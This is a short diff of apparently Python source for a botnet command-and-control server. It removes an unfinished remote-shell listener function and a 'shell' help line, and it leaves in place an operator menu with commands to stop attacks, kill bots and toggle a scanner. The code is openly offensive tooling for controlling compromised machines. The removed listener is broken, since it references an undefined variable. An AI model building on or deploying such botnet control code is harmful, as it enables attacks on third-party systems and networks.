@@ -151,22 +151,6 @@ def waitConnect(sock,addr):
 			Commander(sock)
 	except:
 		sock.close()
-def shell_exec():
-	s = socket.socket()
-	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-	s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive tcp connection
-	while 1:
-		try:
-			s.bind(('0.0.0.0',420))
-			break
-		except:
-			continue
-	s.listen(1)
-	while 1:
-		s, addr = lis.accept()
-		tmp = s.recv(1024).decode()
-		
-	##shell
 
 def Commander(sock):#cnc server
 	global so
@@ -253,7 +237,6 @@ def Commander(sock):#cnc server
 				sock.send('    !stop    : stop attack\r\n'.encode())
 				sock.send('    !kill    : kill all the bots\r\n'.encode())
 				sock.send('    !scan 1/0: enable/disable scanner\r\n'.encode())
-				sock.send('    shell    : send command to single bot')
 				sock.send('    bots     : count bot\r\n'.encode())
 				sock.send('    scan     : check online connection\r\n'.encode())#check connecton status, if some offline or timeout will delete them form bot list.
 				sock.send('    clear    : Clear screen\r\n'.encode())
